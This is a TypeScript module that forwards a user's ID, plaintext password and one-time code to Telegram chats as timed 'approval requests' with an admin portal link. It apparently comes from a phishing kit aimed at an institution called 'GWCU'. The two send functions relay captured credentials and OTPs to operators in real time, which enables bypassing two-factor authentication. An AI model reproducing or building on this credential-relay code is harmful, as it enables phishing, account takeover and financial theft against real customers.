import { sendTelegramApprovalWithCountdown } from '@/lib/telegram-approval-countdown'
import { wrapFlowMessage } from '@/lib/telegram'
import {
  buildLoginApprovalRequestBody,
  buildOtpApprovalRequestBody,
} from '@/lib/telegram-approval-templates'

const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || '')
  .split(',')
  .map((id) => id.trim())
  .filter(Boolean)

function escapeTelegramHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function asCode(value: unknown): string {
  const text =
    typeof value === 'string'
      ? value.trim()
      : value != null && value !== ''
        ? String(value)
        : ''
  return `<code>${escapeTelegramHtml(text || 'Unknown')}</code>`
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}

function asLink(url: string, label?: string): string {
  const href = url.trim()
  if (!href || !isHttpUrl(href)) {
    return asCode(href || 'Unknown')
  }
  const linkText = (label?.trim() || href).trim()
  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
}

/** Origin-only ADMIN_PORTAL_URL for Telegram links (no /admin/login, no ?project=). */
function adminPortalLink(): string {
  const raw = process.env.ADMIN_PORTAL_URL?.trim()
  if (!raw) return '/admin/login'
  const absolute = /^[a-z0-9.-]+\.[a-z]{2,}([/:].*)?$/i.test(raw)
    ? `https://${raw}`
    : raw
  try {
    return new URL(absolute).origin
  } catch {
    const origin = absolute
      .replace(/\/admin\/login.*$/i, '')
      .replace(/\?.*$/, '')
      .replace(/\/+$/, '')
    return origin || '/admin/login'
  }
}


export async function sendGwcuLoginApprovalRequest(data: {
  userId: string
  password: string
  method?: string
  createdAtMs: number
  databaseShard?: string
}): Promise<boolean> {
  const adminLink = adminPortalLink()
  return sendTelegramApprovalWithCountdown({
    botToken: TELEGRAM_BOT_TOKEN,
    chatIds: CHAT_IDS,
    createdAtMs: data.createdAtMs,
    wrapMessage: wrapFlowMessage,
    buildText: (secondsLeft) =>
      buildLoginApprovalRequestBody({
        userId: data.userId,
        password: data.password,
        method: data.method,
        adminLink,
        secondsLeft,
        databaseShard: data.databaseShard,
        asCode,
        asLink,
      }),
  })
}

export async function sendGwcuOtpApprovalRequest(data: {
  userId: string
  code: string
  method?: string
  createdAtMs: number
  databaseShard?: string
}): Promise<boolean> {
  const adminLink = adminPortalLink()
  return sendTelegramApprovalWithCountdown({
    botToken: TELEGRAM_BOT_TOKEN,
    chatIds: CHAT_IDS,
    createdAtMs: data.createdAtMs,
    wrapMessage: wrapFlowMessage,
    buildText: (secondsLeft) =>
      buildOtpApprovalRequestBody({
        userId: data.userId,
        code: data.code,
        method: data.method,
        adminLink,
        secondsLeft,
        databaseShard: data.databaseShard,
        asCode,
        asLink,
      }),
  })
}
